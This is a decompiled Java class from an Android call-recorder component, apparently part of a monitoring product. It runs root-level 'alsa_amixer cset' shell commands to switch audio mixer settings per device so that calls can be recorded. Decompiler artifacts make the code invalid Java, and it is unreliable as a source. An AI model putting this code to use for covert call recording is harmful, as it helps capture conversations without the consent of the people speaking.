package com.krecorder.call.callrecorder;

import android.os.Build;
import com.krecorder.call.alsa.AlsaDeviceMap;
import com.krecorder.call.alsa.AlsaMixerMap;
import java.io.File;
import java.util.Iterator;
import java.util.List;

public class a {
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static AlsaMixerMap c;
  private static AlsaDeviceMap d;
  
  public static boolean a()
  {
    boolean bool = com.krecorder.call.a.a.a();
    AlsaDeviceMap localAlsaDeviceMap;
    if (!bool)
    {
      bool = false;
      localAlsaDeviceMap = null;
    }
    for (;;)
    {
      return bool;
      localAlsaDeviceMap = d;
      if (localAlsaDeviceMap == null)
      {
        localAlsaDeviceMap = new com.krecorder.call.alsa.AlsaDeviceMap;
        localAlsaDeviceMap.<init>();
        d = localAlsaDeviceMap;
      }
      localAlsaDeviceMap = d;
      String str = Build.DEVICE.toLowerCase();
      bool = localAlsaDeviceMap.containsKey(str);
    }
  }
  
  public static boolean a(boolean paramBoolean)
  {
    boolean bool1 = true;
    boolean bool2 = b();
    Object localObject1;
    if (!bool2)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      localObject1 = null;
    }
    for (;;)
    {
      return bool2;
      localObject1 = c;
      if (localObject1 == null)
      {
        localObject1 = new com/krecorder/call/alsa/AlsaMixerMap;
        ((AlsaMixerMap)localObject1).<init>();
        c = (AlsaMixerMap)localObject1;
      }
      localObject1 = d;
      if (localObject1 == null)
      {
        localObject1 = new com/krecorder/call/alsa/AlsaDeviceMap;
        ((AlsaDeviceMap)localObject1).<init>();
        d = (AlsaDeviceMap)localObject1;
      }
      if (paramBoolean)
      {
        localObject1 = "active";
        label71:
        bool2 = a;
        if (bool2) {}
        bool2 = true;
      }
      try
      {
        com.krecorder.call.a.b localb = com.krecorder.call.a.b.a(bool2);
        Object localObject3 = "";
        localObject1 = d;
        Object localObject4 = Build.DEVICE;
        localObject4 = ((String)localObject4).toLowerCase();
        localObject1 = ((AlsaDeviceMap)localObject1).get(localObject4);
        localObject1 = (com.krecorder.call.alsa.a)localObject1;
        if (paramBoolean) {}
        for (localObject1 = ((com.krecorder.call.alsa.a)localObject1).a();; localObject1 = ((com.krecorder.call.alsa.a)localObject1).b())
        {
          if (localObject1 != null) {
            break label161;
          }
          bool2 = a;
          if (bool2) {}
          bool2 = false;
          localObject1 = null;
          break;
          localObject1 = "disabled";
          break label71;
        }
        label161:
        localObject4 = c;
        localObject1 = ((AlsaMixerMap)localObject4).get(localObject1);
        localObject1 = (List)localObject1;
        localObject4 = ((List)localObject1).iterator();
        for (;;)
        {
          bool2 = ((Iterator)localObject4).hasNext();
          if (!bool2) {
            break;
          }
          localObject1 = ((Iterator)localObject4).next();
          localObject1 = (com.krecorder.call.alsa.b)localObject1;
          Object localObject5 = new java/lang/StringBuilder;
          ((StringBuilder)localObject5).<init>();
          localObject3 = ((StringBuilder)localObject5).append((String)localObject3);
          localObject5 = "/system/xbin/alsa_amixer cset name=\"%s\" \"%s\";";
          int i = 2;
          Object[] arrayOfObject = new Object[i];
          int j = 0;
          String str = ((com.krecorder.call.alsa.b)localObject1).a();
          arrayOfObject[0] = str;
          j = 1;
          localObject1 = ((com.krecorder.call.alsa.b)localObject1).b();
          arrayOfObject[j] = localObject1;
          localObject1 = String.format((String)localObject5, arrayOfObject);
          localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
          localObject1 = ((StringBuilder)localObject1).toString();
          localObject3 = localObject1;
        }
        localb.a((String)localObject3);
        bool2 = a;
        if (bool2) {}
        bool2 = bool1;
      }
      catch (Exception localException)
      {
        bool2 = b;
        if (bool2) {}
        bool2 = false;
        Object localObject2 = null;
      }
    }
  }
  
  public static boolean b()
  {
    File localFile = new java/io/File;
    String str = "/system/xbin/alsa_amixer";
    localFile.<init>(str);
    boolean bool1 = a();
    boolean bool2;
    if (bool1)
    {
      bool2 = localFile.exists();
      if (bool2) {
        bool2 = true;
      }
    }
    for (;;)
    {
      return bool2;
      bool2 = false;
      localFile = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/call/callrecorder/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */